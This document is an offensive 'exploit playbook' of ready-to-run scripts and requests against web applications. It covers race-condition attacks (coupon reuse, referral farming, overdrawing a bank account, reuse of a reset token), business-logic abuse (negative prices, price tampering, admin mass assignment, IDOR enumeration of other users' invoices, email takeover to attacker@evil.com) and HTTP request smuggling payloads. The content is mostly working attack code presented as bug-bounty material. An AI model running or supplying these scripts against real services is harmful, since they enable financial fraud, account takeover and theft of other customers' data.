# DEVIL RACE CONDITIONS & BUSINESS LOGIC v777

## ══════════════════════════════════════
## RACE CONDITIONS — EXPLOIT PLAYBOOK
## ══════════════════════════════════════

### Race: Double-Spend / Coupon Reuse
```python
#!/usr/bin/env python3
# Parallel race condition attack using asyncio
import asyncio, aiohttp, time

TARGET = "https://target.com/api/apply-coupon"
COUPON = "SAVE100"
SESSION = "YOUR_SESSION_COOKIE"
THREADS = 50

async def apply_coupon(session, idx):
    async with session.post(TARGET,
        json={"coupon": COUPON},
        headers={"Cookie": f"session={SESSION}"},
        timeout=aiohttp.ClientTimeout(total=5)) as r:
        text = await r.text()
        print(f"[{idx}] {r.status}: {text[:100]}")

async def main():
    async with aiohttp.ClientSession() as session:
        # Send all requests simultaneously
        await asyncio.gather(*[apply_coupon(session, i) for i in range(THREADS)])

asyncio.run(main())
```

### Race: Referral Bonus Farming
```python
# Create account A (referrer)
# Register 50 account B's simultaneously with referrer=A
# Each registration triggers bonus credit if race wins
import asyncio, aiohttp

async def register(session, n):
    await session.post("https://target.com/api/register",
        json={"email": f"victim{n}@evil.com", "referrer": "ACCOUNT_A_CODE"})

async def main():
    async with aiohttp.ClientSession() as s:
        await asyncio.gather(*[register(s, i) for i in range(50)])
asyncio.run(main())
```

### Race: Turbo Intruder (Burp) — Last-Byte Sync
```python
# Burp Suite → Turbo Intruder script
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
        concurrentConnections=50,
        requestsPerConnection=1,
        pipeline=False)
    for i in range(50):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')  # Fire all at exact same time

def handleResponse(req, interesting):
    if '200' in req.response or 'success' in req.response:
        table.add(req)
```

### Race: Transfer Funds to Negative Balance
```bash
# Send same withdrawal request 50x simultaneously
# If check-then-act race: balance goes negative
python3 -c "
import requests, threading
def withdraw():
    requests.post('https://bank.target.com/api/withdraw',
        json={'amount': 1000, 'account': 'mine'},
        cookies={'session': 'YOUR_SESSION'})
threads = [threading.Thread(target=withdraw) for _ in range(50)]
[t.start() for t in threads]
[t.join() for t in threads]
"
```

### Race: Password Reset Token Reuse Race
```bash
# Two requests simultaneously: both consume same OTP → both succeed
python3 -c "
import requests, threading
def use_token():
    r = requests.post('https://target.com/reset',
        data={'token': 'RESET_TOKEN', 'password': 'hacked'})
    print(r.status_code, r.text[:50])
threads = [threading.Thread(target=use_token) for _ in range(10)]
[t.start() for t in threads]
[t.join() for t in threads]
"
```

---

## ══════════════════════════════════════
## BUSINESS LOGIC ATTACKS
## ══════════════════════════════════════

### Logic 1: Negative Price / Quantity
```bash
# Send negative quantity → credit added instead of deducted
curl -X POST "https://target.com/api/cart/add" \
  -d '{"product_id":"1","quantity":-100,"price":-99.99}'

# Negative price on checkout
curl -X POST "https://target.com/api/checkout" \
  -d '{"items":[{"id":"1","price":-999.99,"qty":1}]}'
```

### Logic 2: Price Tampering
```bash
# Change price in client-side request
curl -X POST "https://target.com/api/order" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"product_id":"premium-plan","price":0.01,"currency":"USD"}'

# Change currency to weaker one
-d '{"price":100,"currency":"VND"}'  # $100 VND = $0.004 USD

# Apply discount stacking
-d '{"coupon":"SAVE50","coupon2":"SAVE50","coupon3":"SAVE50"}'
```

### Logic 3: Workflow Bypass
```bash
# Skip steps in multi-step process
# E.g., checkout flow: cart → shipping → payment → confirm
# Go directly to confirm endpoint with forged session state
curl -X POST "https://target.com/api/checkout/confirm" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"order_id":"123","payment_status":"paid"}'
```

### Logic 4: Privilege Escalation via Parameter
```bash
# Change role/subscription in request body
PATCH /api/users/me
{"role": "admin", "subscription": "enterprise", "verified": true}

# Or in account update
curl -X PUT "https://target.com/api/profile" \
  -d '{"name":"ROXX","role":"admin","is_staff":true,"is_superuser":true}'
```

### Logic 5: Free Trial Abuse
```bash
# Trial reactivation by changing date fields
PUT /api/subscription
{"trial_ends_at":"2099-12-31","plan":"enterprise"}

# Delete and recreate account (same email)
# Each creation resets trial
DELETE /api/account
POST /api/register {"email":"same@email.com"}
```

### Logic 6: IDOR in Orders/Invoices
```bash
# Enumerate other users' orders/invoices
for id in $(seq 1000 1100); do
  curl -s "https://target.com/api/orders/$id" \
    -H "Authorization: Bearer TOKEN" | grep -v "403\|not found"
done

# Download other users' invoices
curl "https://target.com/invoices/INV-$id.pdf" -H "Authorization: Bearer TOKEN"
```

### Logic 7: Mass Assignment
```bash
# Find hidden/readonly fields and set them in PUT/PATCH requests
# Common targets: is_admin, is_verified, role, plan, credits, balance

# Find by:
# 1. Looking at GET response for extra fields
# 2. Check DB column names via error messages
# 3. Source code/JS files revealing model structure

PATCH /api/users/me
{
  "name": "ROXX",
  "is_admin": true,          ← add these hidden fields
  "credits": 999999,
  "subscription_plan": "enterprise",
  "email_verified": true,
  "account_status": "active"
}
```

### Logic 8: 2FA for Account Changes Not Required
```bash
# Change email without 2FA confirmation
PUT /api/user/email
{"new_email": "attacker@evil.com"}
# No 2FA prompt = account takeover once email changed + password reset
```

---

## ══════════════════════════════════════
## HTTP REQUEST SMUGGLING
## ══════════════════════════════════════

### CL.TE Smuggling
```
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL Smuggling
```
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

### Detection + Exploitation
```bash
# Use smuggler.py
git clone https://github.com/defparam/smuggler /opt/smuggler -q 2>/dev/null || true
python3 /opt/smuggler/smuggler.py -u "https://target.com" -m POST

# OR use http-request-smuggling nuclei template
nuclei -u https://target.com -t /root/nuclei-templates/http/vulnerabilities/other/http-request-smuggling.yaml

# Manual timing test — CL.TE:
# If server hangs ~10s → vulnerable
curl -s -X POST "https://target.com/" \
  -H "Content-Length: 6" \
  -H "Transfer-Encoding: chunked" \
  -d $'0\r\n\r\nX' \
  --max-time 15 -w "\nTime: %{time_total}s\n"
```

**IMPACT: Critical privilege escalation/financial loss | Bounty: $3,000–$50,000**
